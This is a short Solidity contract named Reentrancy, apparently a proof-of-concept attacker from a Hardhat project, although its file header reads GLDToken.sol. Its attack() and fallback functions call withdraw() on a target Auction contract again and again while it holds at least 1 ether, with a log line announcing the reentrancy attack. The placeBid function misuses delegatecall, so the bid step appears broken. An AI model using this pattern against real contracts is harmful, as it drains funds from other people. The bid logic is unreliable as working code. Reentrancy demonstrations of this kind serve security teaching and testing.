// contracts/GLDToken.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "./Auction.sol";

contract Reentrancy {
    Auction public auction;

    constructor(address _auctionAddress) {
        auction = Auction(_auctionAddress);
    }

    function getAuctionState() public view returns(uint){
        return uint(auction.getState());
    }

    function getAmount() public view returns(uint){
        return address(this).balance;
    }

    function getTokenAmount() public view returns(uint){
        return auction.getTokenBalance();
    }

    function placeBid(uint qty) external payable{
        require(msg.value > 0);
        // A's storage is set, B is not modified.
        bytes memory payload = abi.encodeWithSignature("placeBid(uint256)", qty);
        (bool success, bytes memory data) = address(auction).delegatecall(payload);
        
    }

    function attack() external payable {
        auction.withdraw();
    }
    

    // Fallback is called when Auction sends Ether to this contract.
    fallback() external payable {
        if (address(auction).balance >= 1 ether) {
            console.log("Launching reentrancy attack");
            auction.withdraw();
        }
    }

}
